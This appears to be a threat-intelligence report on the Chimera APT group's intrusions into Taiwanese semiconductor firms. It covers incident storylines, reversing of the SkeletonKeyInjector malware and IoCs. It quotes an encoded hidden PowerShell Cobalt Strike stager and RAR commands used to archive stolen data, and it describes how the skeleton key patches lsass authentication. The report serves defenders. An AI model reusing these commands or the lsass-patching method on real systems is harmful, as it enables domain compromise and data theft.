Our research shows that the\nmajority of these attacks were concentrated on the Taiwan semiconductor sector. This is worthy of\nconcern, as Taiwan’s semiconductor industry plays a very crucial role in the world. Even a small\ndisruption in the supply chain could have a serious ripple effect throughout the entire industry.\nSurprisingly, up until now, there has been less coverage on these attacks. In this report, we seek to\nshed light on the threat actors and campaigns of these attacks, where they are collectively referred\nto as _Operation Skeleton Key. Additionally, we provide a brief overview of the current information_\n​ ​\nsecurity status of Taiwan’s semiconductor industry.\n\nWith decades of development, Taiwan has established itself as a leading player in the\nsemiconductor supply chain, including many well-known leaders in the area. According to a report\nby the Semiconductor Equipment and Materials International (SEMI),the global industry\nassociation representing the electronics manufacturing supply chain, Taiwan has been the largest\nconsumer of semiconductor materials in the past several years [1]. Meanwhile, Wikipedia, says that\nTaiwan is currently among the top 5 sales leaders in multiple segments including foundry,\n​\nintegrated device manufacturer (IDM), fabless and outsourced semiconductor assembly and testing\n(OSAT) [2]. In 2019, Taiwan’s total semiconductor value reached a staggering $11.4 billion.\nNeedless to say, the repercussions from a cyber attack on Taiwan’s semiconductor sector could be\ncatastrophic.\n\nDue to the high market value of the semiconductor industry, vendors have invested heavily in\ntheir cyber capabilities, especially in protecting the industrial control system (ICS) equipment used\nin fabrication plants. Although operational technology (OT) and information technology (IT)\nsecurity is equally important, more emphasis has been placed on the former. This is evidenced by\nthe fact that many vendors have opted to isolate their ICS equipment to ensure the manufacturing\nprocess is never interrupted. The downside to this approach is that once malicious code finds its\nway into the isolated environment, it can spread to other machines very quickly. One foremost\nexample is the 2018 WannaCry ransomware attack on TSMC [3]. The hit on the world’s largest\nfoundry company forced some of the plants to go offline for an entire day. Additionally, it took\nseveral days before the malware could be fully eradicated. The total damage caused by this attack\nreached $256 million. Separately, ASUS, which is a leading PC manufacturer in Taiwan, saw\nmillions of its users impacted by _Operation ShadowHammer [4]. In this report, we will show how_\n​\nIT attacks on semiconductor vendors can be just as damaging as an OT attack.\n\nBetween 2018 and 2019, we discovered several attacks on various semiconductor vendors\nlocated at the Hsinchu Science-based Industrial Park in Taiwan. As these attacks employed similar\nattack techniques and tactics, a pattern could be discerned from the malicious activities. From this\npattern, we deduced that these attacks, which we dubbed _Chimera APT Group, were actually_\n​ ​\nconducted by the same threat actor. The main objective of these attacks appeared to be stealing\nintelligence, specifically documents about IC chips, software development kits (SDKs), IC\ndesigns, source code, etc. If such documents are successfully stolen, the impact can be devastating.\nThe motive behind these attacks likely stems from competitors or even countries seeking to gain a\n\n\n-----\n\ncompetitive advantage over rivals. Since these techniques and tactics were similar to previous attack\nactivities, we suspect the attacker is a China-based hacker group. We thus hope that this report will\nhelp semiconductor companies gain a better understanding of the dangers from such attacks.\nAdditionally, as we have worked with several of the semiconductor vendors to improve their cyber\nsecurity, we wish to share this valuable experience, and highlight the current challenges facing the\nentire industry.\n\nIn this report, we conduct a comprehensive analysis on the employed technologies, tactics, and\ncustomized malware of Chimera APT Group. As this operation has not yet been documented, the\n​ ​\ntechniques and tactics disclosed in this report can help blue teams design better defenses, and\ndevelop better detection and hunting methods. Below summarizes our findings of Chimera.\n​ ​\n\n1. A unique account manipulation malware  - SkeletonKeyInjector – was used.\nSkeletonKeyInjector contained code extracted from Dumpert and Mimikatz. This malware\nimplanted a skeleton key into domain controller (DC) servers to continuously conduct lateral\nmovement (LM). Additionally, by making direct syscalls, the malware could bypass security\nproducts based on API hooking. This malware was discovered in the two cases mentioned in\nthis report.\n2. The threat actor utilized Cobalt Strike as their main remote-access Trojan (RAT). The\nmutated Cobalt Strike backdoor replaced and masqueraded as Google Update to confuse\nusers. Additionally, as most corresponding (command and control) C2s were located in the\nGoogle Cloud Platform, it made it difficult to attribute the actor. Aside from the two cases\nmentioned in this report, we also detected the presence of this malware in other\nsemiconductor vendors.\n3. Chimera used an old and patched version of RAR for data exfiltration. The same binary was\nfound in the two cases mentioned in this report.\n\n## Storyline of the Operation\n\nDuring our investigation of _Chimera APT Group between 2018 to 2019, more than 30,000_\n​\nendpoints belonging to various semiconductor vendors were analyzed. Two representative cases\n​ ​\nwere chosen for a deeper analysis. The two cases (hereafter Case A and Case B) involved in the\nanalysis currently have a leading global position in their own market segments. With business sites\nscattered around the world and a large annual revenue, their main research and development hub are\nboth located in Taiwan. Two different approaches were adopted when investigating the two\ncompanies. For Case A, as we already enjoyed a long-term cooperation, our assistance focused on\nmonitoring their systems. This allowed us to quickly identify the cyber attack in a short period of\ntime. By contrast, as victims in Case B discovered on their own various abnormal activities, they\nasked for our help to formulate an effective incident response. During our forensic investigation, we\nfound that the attacks had already been occurring for more than a year. As the activities, attack\ntechniques and tactics were similar in the other cases we investigated, we believe this was the work\nof the same threat actor.\n\n### Case A: \n\nIn this case, the victim company had already subscribed to our continuous threat hunting\n\n\n-----\n\nservice. Our investigation revealed malicious activities occurring between 2019-12-09 ~\n2019-12-10. Meanwhile, in this incident, 15 endpoints and 6 user accounts were compromised, and\n4 malwares and 8 C2 servers were found.\n\nTo help better depict the operational details of this case, the cyber situation graph and storyline\nis respectively shown in Fig 1. Note that all the server/user names are de-identified, and replaced\nwith names that can represent their roles.\n\n_Figure 1: Storyline in Case A_\n\n\n-----\n\nThe same APT malware - GoogleUpdate.exe - was found on two endpoints. On the day we\ndiscovered this malware, no information could be found on VirusTotal (VT). To confuse security\nproducts and analysts, the malware replaced the original GoogleUpdate binary and functioned as a\nmutated Cobalt Strike beacon to inject payloads into other processes. Moreover, network security\ndevices had difficulty detecting the associated C2 servers, as they were located in the Google Cloud\nPlatform. The C2 server domains are listed in Appendix I of the IoC section.\nAfter successfully connecting back to the C2, the attacker used RECORDEDTV.MS to archive\nthe stolen data for data exfiltration. It is worthy to note that even without the .exe file extension, the\ndata exfiltration process could still be executed. Identical binaries were found in several machines,\nbut under different names, e.g. RECORDEDTV.MS, uncheck.dmp, and jucheck.exe. This aroused\nour suspicions and prompted us to suspect the binary was masquerading as a Java Update program.\nInserting malware in a location where legal software is stored seems to be a characteristic tactic of\n_Chimera. For this case, it was found that the disguised program, which was a modified RAR_\n​\nsoftware, had a one-byte discrepancy from the original version. We are still ascertaining the reasons\nbehind this difference.\nTo track the root cause, we found that the first Cobalt Strike backdoor was located at\nNB-CLAIR, and was then remotely copied to Server-LAUREN. A valid account was used to invoke\nCobalt Strike via schtasks (Fig 2).\n\n_Figure 2: schtask is used for lateral movement_\n\n\n-----\n\nThe recon activities in Server-LAUREN are illustrated in the figure below. Several \"net user”\ncommands were executed for recon purposes, and the results were saved to the RecordedTV_lib.log\n(Fig 3).\n\n_Figure 3: Reconnaissance commands_\n\nOur analysis also showed that Server-LAUREN used wmic to remotely execute various\ncommands in another endpoint to check if there was an Internet connection (Fig 4).\n\n_Figure 4: Reconnaissance via wmic_\n\n\n-----\n\nServer-LAUREN also archived the registry and ntds.dit to other hosts for offline breaking. The\nlatter is an AD database, which contains information about domain hosts and users, e.g. id, name\nand password hash. Since this file was encrypted, and the key was stored in the SYSTEM registry,\nthe threat actor needed to archive both ntds.dit and the registry to both decrypt the file and remotely\nbrute-force the password hash. The control of Server-LAUREN, which was also achieved via\nschtasks, was traced back to the NB-CLAIR machine. From the NB-CLAIR timeline, we noticed\nthat a remote desktop program (RDP) from a certain IP was run just six minutes before the schtasks\nwas executed (Fig 5). Since this IP was a VPN server, and a valid account was used to log in to it,\nwe believe the actor acquired the password from a separate data breach.\n\n_Figure 5: Overall activities_\n\nAt the end of the attack, the wlanapi.dll malware, which we dubbed SkeletonKeyInjector, was\nused for persistence. More details of the malware reversing will be provided in **Sec. 4 Malware**\n​\n**Reversing.**\n​\n\n\n-----\n\n### Case B: \n\nSuspicious activities were discovered in the victim company of Case B during an upgrade to\ntheir network infrastructure. We were tasked by the company to investigate this incident, which\nbegan in November 2019. During our investigation, we found that the cyber attack pattern\nresembled the tactics employed by _Chimera. The entire attack occurred between October 7, 2018 to_\n​ ​\nNovember 18, 2019, and a total of 24 endpoints were compromised. In these endpoints, 8\ncompromised accounts, 3 malware and 5 C2 servers were discovered. The persistence of this attack\ncan be seen by the fact that it lasted for more than a year. The cyber situation graph and storyline\nare respectively shown in Fig 6 and Fig 7.\n\nUnlike Case A, powershell scripts were widely used, which can be seen in following code\nsnippets. To avoid the file-based detection mechanism, the payload was injected directly into the\nsystem memory. The injected malware was discovered in roughly 10 endpoints, which included two\ndomain controllers. The powershell script was a Cobalt Strike backdoor and was used for process\nmigration to other system processes. We found several hosts that had the Cobalt Strike malware\nimplanted in their infected svchost.exe. Despite the discovery of the early stage malware and\nactivities, the launch of our investigation was already at a very late point in time. Thus, there was\ninsufficient evidence to pinpoint the likely initial access point. We surmise that the attack occurred\nvia stolen valid credentials or phishing emails.\n```\n  powershell -nop -w hidden -encodedcommand\n   JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEM\n   AbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAE\n   EAQQBBAEEAQQBBAEEAQQBLAFYAVwBiAFcALwBpAE8AQgBEACsAMwBQAHcASwBYADQAVgAwAG8ASgBaADMAdABnA\n   HQAZABWAFYAbwBuAFEAQQBrAGwAbABKAGMAVwAyAGsAWABWAHkAUwBRAG0AdQBEAGcASgBkAFoAeQBtAGQATABm\n   AC8ALwBTAFkAdgA1AEoAYgAyAGIAawArADYAaQB4AFEAbABuAHMAdwA4AE0AOAA5ADQAUABKAE0AcABsAGMAVwB\n   wAEYATQB5AFUAaABtAGQAUgBWAEoAeABSADQAVABQ\n\n```\n\n-----\n\n_Figure 6: Storyline of Case B_\n\n\n-----\n\n_Figure 7: Cyber situation graph of Case B_\n\nAs mentioned earlier, legal cloud services were widely used by _Chimera as their C2 to avoid_\n​\nthreat attribution. In this case, Appspot[.]com and azureedge[.]net were applied as the C2. The actor\nalso used a RAR program under the guise of innocuous file names such as RecordedTV.ms,\njucheck.exe and vmware.log to archive and steal the data of interest. A similar scheme was utilized\nby the attacker to archive the passwords they used. The following shows a sample command of the\narchived information.\n```\n  c:\\users\\xxxx\\libraries\\RecordedTV.ms a -m5 -v71m -hpfuckyou.google.com11 vmlum-vss.log\n   vmlum-vmvss.log\n  C:\\Windows\\system32\\cmd.exe /C c:\\users\\xxxxxx\\libraries\\RecordedTV.ms a -m5 -r\n   -hpfuckyou.google.com11 vmlum-vmopt.log\n   “\\\\<Hostname>\\personal\\<Username>\\<Product>-Traning-v1.1.pptx\" > vmlumss.log & dir\n   vmlum-vmopt*\n\n### Leaked File Name\n\n```\nBased on the file names of the stolen files, it seemed to include chip documents, SDKs and\neven the source code. The key motive of the actor was to acquire semiconductor proprietary data.\nSimilar to Case A, a DLL file (d3dll.dll) was used to deploy a Skeleton Key malware. An\nin-memory patch was performed to allow easy system log-in. Some of the de-identified leaked file\nnames are listed below.\n```\n  \\\\Users\\<Account>\\Project\\Roadmap\n  \\\\Users\\<Account>\\Backup\\Workspace\n  \\\\Users\\<Account>\\chip and SDK setting\n  \\\\Users\\<Account>\\<Productname> SDK Installation guide.pdf\n\n```\nIt is worthy to note that among the various semiconductor vendors we investigated, similarities\nwere seen in the deployed malware, techniques, and tactics. This particular APT group seemed to\n\n\n-----\n\nhave a keen interest in targeting the semiconductor industry. Additionally, in the absence of an AD\nmonitoring system, we saw some vendors employing a white-list enforcement approach. Although\nthis is a feasible approach, as the AD cannot execute any software outside the white-list, our\ninvestigation shows that APT actors were still able to use Living off the Land Binaries (LOL) bins\nto launch an attack.\n## Malware Reversing\n\nOur analysis also revealed several suspicious memory modules. The first memory module\nresembled a CobaltStrike or metasploit beacon. The memory module was a PE file with a broken\nheader, as seen in Fig 8 and Fig 9. From the figure, we can also see that the PE metadata has some\ninvalid values, which contain a hidden shellcode (from offset 2).\n\n_Figure 8: Raw content of the memory module_\n\n_Figure 9: PE information_\n\n\n-----\n\nThe disassembled shellcode, which is a Reflective Loader, is listed in Fig 10. It first located\nthe next payload at offset 0x1791C, and then loaded the payload. Meanwhile, 56A2B5F0 is the API\nhash of ExitProcess, which denotes the process exit.\n\n_Figure 10: Reflective loader shellcode_\n\nThe other memory modules contained a different CobaltStrike beacon, and were used for\nmigration. The first stage beacon injected a payload to a process for process migration. From the\nmemory content (Fig 11), the “.\\pipe\\mojo.5688.805…” string was the pipe created by the\nCobaltStrike beacon.\n\n_Figure 11: Partial content in memory module_\n\nAs we performed a deeper reverse engineering, we found that the process migration made use\nof the pipe inter-process (IPC) mechanism for communication. The injected code first used\nCreateNamePipe and ConnectNamePipe to establish an IPC with the original beacon (Fig 12). After\nreading the entire shellcode via the ReadFile from the name pipe, the shellcode was invoked in\n0x401155, and a CobaltStrike backdoor was created (Fig 13).\n\n\n-----\n\n_Figure 12: Disassemble shellcode I_\n\n_Figure 13: Disassemble shellcode II_\n\n\n-----\n\n### d3d11.dll \n\nMD5: bb897e34bc0d1e82dfe79d0898f5aa88\nSHA256: c3681cd6e3fb12a4962091a981598c636f214237ec6c8b2915b2ff714d7f6e49\n\nUpon discovery of this sample, we first performed a retrohunt analysis. The discovery of a\nrelated binary led us to initially believe the sample was a Dumpert. However, a more in-depth\nanalysis revealed that the d3d11.dll sample implanted a skeleton key, where adversaries could\npersistently control (before the system reboot) the infected machine and machines under the\ninfected AD. More specifically, the malware was an account manipulation tool that contained code\nextracted from both Dumpert and Mimikatz. We called this malware SkeletonKeyInjector. The\nmalware employed a technique that altered the NTLM authentication program and implanted a\nskeleton key to allow adversaries to log-in without a valid credential. This allowed the adversary to\nachieve the following objectives:\n\n  - Persistence: After the code in memory was altered, the adversary could gain access to the\ncompromised machines before the next system reboot. As AD machines are rarely rebooted,\nthe adversary was able to control the machines for a very long time.\n\n  - Defense Evasion: Aside from the different login password and login algorithm scheme,\nthere was no difference when compared to a normal login activity. Furthermore, normal\nusers could still log-in to the system via their original password. Thus, the probability of\nbeing exposed was low.\n\n  - Lateral Movement: Adversaries could use the skeleton key to log in to other machines that\nwere in the same domain. This made it easier for an adversary to conduct lateral movement.\n\nTo show which functions shared a resemblance to Mimikats or Dumpert, we reversed the\nfunctions of d3d11.dll and recovered the function names in Fig 14. For easy understanding, we\nrecovered the function names that migrated from Mimikatz, which have either the “kuhl” or “kull”\nprefix. As for functions that migrated from Dumpert, the prefix “Dumpert” was included in the\nname. For functions that were implemented by the adversary, no prefix was added.\n\n\n-----\n\n_Figure 14: Reversed function names_\n\nIn order to bypass the API monitoring, which is widely used in anti-virus or EDR products, the\nmalware directly invoked syscalls and implemented high level API logic. Since the syscall numbers\ndiffer between each Windows version, the following code snippet was used to determine the OS\nversion in use, and thereby obtain the correct syscall number. Our analysis showed that this code\nsnippet was copied from Dumpert.\n\n_Figure 15: Dumpert detect OS version capability_\n\nTo run the Mimikatz code snippet used by the malware, a privilege called\n\n\n-----\n\nSE_DEBUG_PRIVILEGE was needed. The code shown in Fig 16 used RtlAdjustPrivilege to\nobtain the SE_DEBUG_PRIVILEGE to allow the malware to open, read, and write other process\nmemory as a debugger. By comparing the code snippet (Fig 17) with the original code in Mimikatz\n(Fig 18), we found that instead of calling the OpenProcess API, the malware instead invoked\nOpenProcess via Dumpert. As mentioned earlier, the malware sought to bypass the API hooking via\nsyscalls.\n\n_Figure 16: SE_DEBUG_PRIVILEGE_\n\nSkeletonKeyInjector first searched for the string “Kerberos-Newer-Keys” in the lsass.exe\nprocess memory. When the “Kerberos-Newer-Keys” address was found, it then searched for the\nUnicode structure in the memory that referenced this address. Afterwards, the Unicode structure\nwas altered with empty strings by manipulating the string reference to an empty string and size\nzero. This manipulation downgraded the lsass.exe in using insecure crypto scheme - RC4 without\nsalt. From Fig 17 and Fig 18, the similar code segments between Mimikatz and d3d11.dll are\nshown.\n\n_Figure 17: SkeletonKeyInjector Code Snippet I_\n\n\n-----\n\n_Figure 18: Similar code in Mimikatz_\n\n_Figure 19: Code of SkeletonKeyInjector to patch the CDLocateCSystem_\n\nAfter downgrading to RC4, the SkeletonKeyInjector altered the function pointers\nin cryptdll.dll!CDLocateCSystem by redirecting them to its customized functions (Fig 19).\nSpecifically, two functions were altered, one for the RC4 initialization, and the other for the RC4\ndecryption. In the RC4 initialization function, a new RC4 NTLM was injected with a pre-calculated\nhash value of the skeleton key. When the authentication check failed due to incorrect credentials,\nthe RC4 decryption function prompted the authentication process to compare the credentials with\nthe skeleton key. Once a match was confirmed, the log in was permitted. Noteworthy, the malware\ncontained customized NTLM hash, which had a slight difference over the original Mimikatz.\n\n\n-----\n\n_Figure 20: Forged RC4 init function_\n\nIn Fig 20 and 21, the similarities between SkeletonKeyInjector and Mimikatz are illustrated.\n\n_Figure 21: Forged RC4 init function in Mimikatz_\n\n\n-----\n\n### RecordedTV.ms (jucheck)\n\nMD5: c9b8cab697f23e6ee9b1096e312e8573\nSHA256: 66f13964c87fc6fe093a9d8cc0de0bf2b3bdaea9564210283fdb97a1dde9893b\n\nThis program is not considered malware, but a modified legitimate RAR program that was\nutilized in this operation. The original version is shown below:\n```\n  RAR 3.60 beta 8 Copyright (c) 1993-2006 Alexander Roshal 20 Jul 2006\n\n```\nSpecifically, this is a rar.exe v3.6. In Figure 22, the left section shows the original rar.exe,\nwhile the right section depicts the RecordedTV.ms.\n\n_Figure 22: Patched byte in RecordedTV.ms_\n\nOur research shows one of the bytes in the code segment was altered, as depicted in Figure\n23. However, we are still determining the reason why a byte size data was altered. All of the cases\nthat we investigated used this modified rar.exe program to archive the stolen data, which is\nevidence that these attacks were likely conducted by the same group.\n\n_Figure 23: Disassembly result of patched byte in RecordedTV.ms_\n\n\n-----\n\n### BaseClient.exe\n\nmd5: 33c00ef025cd1b4c40aa185a2f1f0623\nsha256: 5b5199d4bfab8517a8cf1ad464e14961e32c8e694fc3ba54619292a2578011ef\n\nThe last malware involved in this operation was BaseClient.exe, which is a general network\ntesting tool. We suspect this program was not developed by the adversary, but was obtained from a\nbenign source. Used by the adversary for network reconnaissance, it is unlikely to be flagged by\nsecurity systems, as the program may be inherently benign.\n\n_Figure 24: Code snippet of BaseClient.exe_\n\n\n-----\n\n## MITRE ATT&CK Techniques\n\nIn this chapter, we summarize the techniques employed in _Chimera APT. These techniques are_\n​ ​\norganized based on the MITRE ATT&CK framework.\n\n### Tactic ID Technique Description Initial T113 External The threat actor’s first entry point was from Access 3  Remote a VPN server, where a valid account was\n\n|Tactic|ID|Technique|Description|\n|---|---|---|---|\n|Initial Access|T113 3|External Remote Services|The threat actor’s first entry point was from a VPN server, where a valid account was used.

We believe these attacks originated from the same threat actor - _Chimera, as these attacks_\n​ ​\nutilized similar tactics, techniques and even the same customized malware. The actor likely\nharvested various valid credentials via phishing emails or data breaches as their starting point to\nconduct their cyber attack on the vendors. CobaltStrike was later used as their main RAT tool. To\navoid detection, the CobaltStrike RAT was often masqueraded as a Google Chrome Update. The\nRAT would then connect back to their C2 server. As these servers were in a public cloud server, it\nmade it difficult to track. Subsequently, by compromising the AD server, the delicate malware\n\n- SkeletonKeyInjector - was invoked to implant a general key to allow LM, persistence and defense\nevasion. Although this malware was discovered for the first time, we have high confidence that\nthese attacks were conducted by the same threat actor. Based on the stolen data, we infer that the\nactor’s goal was to harvest company trade secrets. The motive may be related to business\ncompetition or a country’s industrial strategy. We hope that the tactics, techniques and IoCs\ndisclosed by this report can better help semiconductor vendors improve their security mechanisms\nand prevent such attacks from occurring again.\n\n\n-----\n\n## Reference\n\n1.
